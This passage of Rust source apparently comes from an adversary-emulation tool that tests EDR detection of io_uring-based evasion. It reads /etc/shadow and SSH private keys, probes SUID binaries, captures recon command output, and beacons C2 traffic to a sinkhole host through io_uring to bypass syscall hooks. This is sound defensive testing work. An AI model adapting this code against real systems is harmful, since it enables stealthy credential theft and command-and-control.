                    }
                    Err(e) => {
                        let line = format!("[--] T1003.008 io_uring read /etc/shadow: {e}");
                        warn!("  {line}");
                        report.push(line);
                    }
                }

                // First id_* private key in /root/.ssh -- read whatever is there
                // (id_rsa, id_ed25519, id_ecdsa).  Read-only, contents discarded
                // after the byte count.
                let ssh_key = std::fs::read_dir("/root/.ssh")
                    .ok()
                    .and_then(|rd| {
                        rd.flatten()
                            .map(|e| e.path())
                            .find(|p| {
                                p.file_name()
                                    .and_then(|n| n.to_str())
                                    .map(|n| n.starts_with("id_") && !n.ends_with(".pub"))
                                    .unwrap_or(false)
                            })
                    });
                if let Some(key_path) = ssh_key {
                    let key_str = key_path.to_string_lossy().into_owned();
                    match t1106_iouring_read_file(&mut ring, &key_str, 0x37, &mut buf) {
                        Ok(n) => {
                            let line = format!(
                                "[OK] T1552.004 io_uring read {key_str}: {n} bytes (SSH private key)"
                            );
                            info!("  [-->] {line}");
                            report.push(line);
                        }
                        Err(e) => {
                            let line = format!("[--] T1552.004 io_uring read {key_str}: {e}");
                            warn!("  {line}");
                            report.push(line);
                        }
                    }
                } else {
                    report.push(
                        "[--] T1552.004 io_uring read SSH private key: no id_* key under /root/.ssh"
                            .to_string(),
                    );
                }
            } else {
                report.push(
                    "[skip] root-only reads (/etc/shadow, /root/.ssh) -- not running as root"
                        .to_string(),
                );
            }

            // Step 4: SUID discovery -- Statx each candidate, flag the setuid bit.
            let mut suid_hits: Vec<&str> = Vec::new();
            for (i, cand) in T1106_SUID_CANDIDATES.iter().enumerate() {
                let cpath = match CString::new(*cand) {
                    Ok(c) => c,
                    Err(_) => continue,
                };
                // The kernel fills a `struct statx` (a fixed 256-byte UAPI
                // structure) into this buffer.  We use a raw byte buffer rather
                // than libc::statx because libc does not expose `statx` /
                // STATX_MODE / AT_STATX_SYNC_AS_STAT on all targets (notably
                // musl); io_uring::types::statx is an opaque placeholder, so the
                // pointer is just cast to it.  stx_mode is a u16 at offset 28.
                let mut stx = [0u8; T1106_STATX_BUF_LEN];
                let statx_e = opcode::Statx::new(
                    types::Fd(libc::AT_FDCWD),
                    cpath.as_ptr(),
                    stx.as_mut_ptr().cast::<types::statx>(),
                )
                .flags(T1106_AT_STATX_SYNC_AS_STAT)
                .mask(T1106_STATX_MASK_MODE)
                .build()
                .user_data(0x40 + i as u64);
                let r = t1106_ring_submit(&mut ring, &statx_e, &format!("statx {cand}"));
                let mode = u16::from_ne_bytes([
                    stx[T1106_STATX_MODE_OFFSET],
                    stx[T1106_STATX_MODE_OFFSET + 1],
                ]);
                if matches!(r, Ok(0)) && (u32::from(mode) & T1106_S_ISUID) != 0 {
                    suid_hits.push(*cand);
                }
            }
            let suid_line = if suid_hits.is_empty() {
                "[OK] privesc io_uring statx: no setuid bit on probed candidates".to_string()
            } else {
                format!(
                    "[OK] privesc io_uring statx: setuid binaries -> {}",
                    suid_hits.join(", ")
                )
            };
            info!("  [-->] {suid_line}");
            report.push(suid_line);

            // Step 4b: Recon command output via io_uring -- spawn benign
            // read-only commands (whoami / id / hostname / uname -a) and read
            // their stdout back through the ring (IORING_OP_READ on the pipe
            // fd).  This matches the published RingReaper behaviour of using
            // io_uring to exfiltrate child-process output; the spawn itself
            // still uses fork+execve (kernel has no IORING_OP_EXEC).  All
            // commands are read-only, bounded by their own brief execution,
            // and the children are reaped before returning -- fully reversible.
            for (i, (cmd, args)) in T1106_RECON_COMMANDS.iter().enumerate() {
                let ud = 0x80 + i as u64;
                match t1106_iouring_read_command_output(&mut ring, cmd, args, ud, &mut buf) {
                    Ok((first_line, n)) => {
                        let preview = if first_line.is_empty() {
                            "<empty>".to_string()
                        } else if first_line.len() > 60 {
                            format!("{}...", &first_line[..57])
                        } else {
                            first_line
                        };
                        let line = format!(
                            "[OK] recon-cmd io_uring read stdout of `{cmd}`: {n} bytes ({preview})"
                        );
                        info!("  [-->] {line}");
                        report.push(line);
                    }
                    Err(e) => {
                        let line = format!("[--] recon-cmd `{cmd}`: {e}");
                        warn!("  {line}");
                        report.push(line);
                    }
                }
            }

            // Step 5: C2 over io_uring -- Connect + Send + Recv to the sinkhole.
            let sinkhole_ip = crate::techniques::resolve_sinkhole_ip().await;
            let c2_line = match sinkhole_ip.parse::<std::net::Ipv4Addr>() {
                Ok(ip) => {
                    // The socket fd is created with the libc wrapper (a single
                    // socket(2)); the meaningful, EDR-hooked operations --
                    // connect, send, recv -- are all driven over io_uring below.
                    let sockfd = unsafe { libc::socket(libc::AF_INET, libc::SOCK_STREAM, 0) };
                    if sockfd < 0 {
                        "[--] T1106 C2: socket() failed".to_string()
                    } else {
                        let mut addr: libc::sockaddr_in = unsafe { std::mem::zeroed() };
                        addr.sin_family = libc::AF_INET as libc::sa_family_t;
                        addr.sin_port = 80u16.to_be();
                        addr.sin_addr = libc::in_addr {
                            s_addr: u32::from_ne_bytes(ip.octets()),
                        };

                        // Build the C2 sequence as a single linked CHAIN
                        // (IOSQE_IO_LINK) -- Connect → Send → Recv -- so the
                        // whole exchange is one io_uring_enter under standard
                        // mode and zero under SQPOLL.  This matches the
                        // published RingReaper IoC profile.
                        let connect_e = opcode::Connect::new(
                            types::Fd(sockfd),
                            &addr as *const libc::sockaddr_in as *const libc::sockaddr,
                            std::mem::size_of::<libc::sockaddr_in>() as libc::socklen_t,
                        )
                        .build()
                        .user_data(0x50);
                        let send_e = opcode::Send::new(
                            types::Fd(sockfd),
                            T1106_BEACON.as_ptr(),
                            T1106_BEACON.len() as u32,
                        )
                        .build()
                        .user_data(0x51);
                        let recv_e = opcode::Recv::new(
                            types::Fd(sockfd),
                            buf.as_mut_ptr(),
                            buf.len() as u32,
                        )
                        .build()
                        .user_data(0x52);

                        let result = match t1106_ring_submit_chain(
                            &mut ring,
                            &[connect_e, send_e, recv_e],
                            "C2 connect->send->recv chain",
                        ) {
                            Ok(results) if results.first().copied().unwrap_or(-1) >= 0 => {
                                let sent = results.get(1).copied().unwrap_or(-1);
                                let recvd = results.get(2).copied().unwrap_or(-1);
                                format!(
                                    "[OK] T1106 C2 over io_uring (chain): connect {sinkhole_ip}:80, sent {} bytes, recv {} bytes",
                                    sent.max(0),
                                    recvd.max(0)
                                )
                            }
                            Ok(results) => format!(
                                "[--] T1106 C2: chain connect to {sinkhole_ip}:80 failed (errno {})",
                                -results.first().copied().unwrap_or(-1)
                            ),
                            Err(e) => format!("[--] T1106 C2: {e}"),
                        };

                        // Second-channel beacon via IORING_OP_WRITE on the same
                        // socket fd -- exercises a different opcode so EDR rules
                        // that only key on Send/Recv have a separate IoC to fail.
                        let write_e = opcode::Write::new(
                            types::Fd(sockfd),
                            T1106_BEACON_WRITE.as_ptr(),
                            T1106_BEACON_WRITE.len() as u32,
                        )
                        .build()
                        .user_data(0x60);
                        match t1106_ring_submit(&mut ring, &write_e, "C2 write second-channel") {
                            Ok(n) if n >= 0 => {
                                let line = format!(
                                    "[OK] T1106 C2 OP_WRITE second-channel: {n} bytes to {sinkhole_ip}:80"
                                );
                                info!("  [-->] {line}");
                                report.push(line);
                            }
                            Ok(n) => {
                                let line = format!(
                                    "[--] T1106 C2 OP_WRITE second-channel failed (errno {})",
                                    -n
                                );
                                warn!("  {line}");
                                report.push(line);
                            }
                            Err(e) => {
                                let line = format!("[--] T1106 C2 OP_WRITE second-channel: {e}");
                                warn!("  {line}");
                                report.push(line);
                            }
                        }

                        // Close the socket over io_uring; fall back to libc::close.
                        let close_e = opcode::Close::new(types::Fd(sockfd))
                            .build()
                            .user_data(0x53);
                        if t1106_ring_submit(&mut ring, &close_e, "close socket").is_err() {
                            unsafe {
                                libc::close(sockfd);
                            }
                        }
                        result
                    }
                }
                Err(_) => format!("[--] T1106 C2: could not parse sinkhole IP {sinkhole_ip}"),
            };
            info!("  [-->] {c2_line}");
            report.push(c2_line);

            // Persist a local audit log via normal I/O -- on purpose: we WANT
            // this record visible.  Only the recon/C2 above is syscall-less.
            let mut artifacts: Vec<String> = Vec::new();
            if let Err(e) = fs::create_dir_all(&work_dir) {
                warn!("[T1106-IOURING] could not create {work_dir}: {e}");
            } else {
                let body = report.join("\n");
                if let Err(e) = fs::write(&log_path, format!("{body}\n")) {
                    warn!("[T1106-IOURING] could not write {log_path}: {e}");
                } else {
                    artifacts.push(log_path.clone());
                    artifacts.push(work_dir.clone());
                }
            }

            let steps_ok = report.iter().filter(|l| l.starts_with("[OK]")).count();
            let summary = format!(
                "T1106-IOURING complete: {steps_ok} io_uring steps OK (ring_mode={ring_mode}; \
                 reads: {target_file}, /proc/net/tcp, {utmp}{}; statx {} SUID candidates; \
                 recon-cmd stdout via ring for {} commands; C2 chain connect->send->recv + \
                 OP_WRITE second-channel to {sinkhole_ip}) -- all I/O via io_uring SQEs, \
                 no equivalent openat/read/connect/recv/statx/write syscalls.",
                if crate::utils::is_root() { ", /etc/shadow, /root/.ssh/id_*" } else { "" },
                T1106_SUID_CANDIDATES.len(),
                T1106_RECON_COMMANDS.len()
            );
            info!("{summary}");

            let cleanup_required = !artifacts.is_empty();
            Ok(SimulationResult {
                technique_id: self.info().id,
                success: true,
                message: summary,
                artifacts,
                cleanup_required,
            })
        })
    }

    fn cleanup<'a>(&'a self, artifacts: &'a [String]) -> CleanupFuture<'a> {
        Box::pin(async move {
            info!("[T1106-IOURING] Cleaning up artefacts...");

            // Two-pass: files first, then directories, so per-file failures are
            // surfaced before the wholesale directory removal.
            let mut dirs: Vec<&String> = Vec::new();
            for artifact in artifacts {
                let p = Path::new(artifact);
                if !p.exists() {
                    continue;
                }
                if p.is_dir() {
                    dirs.push(artifact);
                    continue;
                }
                match fs::remove_file(artifact) {
                    Ok(_) => info!("  [OK] Removed {artifact}"),
                    Err(e) => warn!("  Failed to remove {artifact}: {e}"),
                }
            }
            for d in dirs {
                match fs::remove_dir_all(d) {
                    Ok(_) => info!("  [OK] Removed dir {d}"),
                    Err(e) => warn!("  Failed to remove dir {d}: {e}"),
                }
            }

            info!("[T1106-IOURING] Cleanup complete");
            Ok(())
        })
    }
}
